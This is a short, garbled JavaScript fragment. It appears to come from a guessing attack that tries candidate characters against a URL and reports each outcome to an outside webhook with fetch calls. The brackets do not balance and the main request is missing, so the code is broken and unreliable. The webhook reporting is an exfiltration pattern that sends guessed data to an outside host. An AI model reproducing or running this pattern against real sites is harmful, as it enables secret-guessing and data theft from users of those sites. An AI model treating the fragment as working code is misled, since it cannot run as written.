    var letters = '';

    }

        
    async function doGuess(g){
        console.log('attempting '+url+g);

        .then(response => {

                fetch(whook+'SUCCESS')
                
            }
        })
        .catch(error => {fetch(whook+g+'failed')})
    }
    //makeFetchRequest();
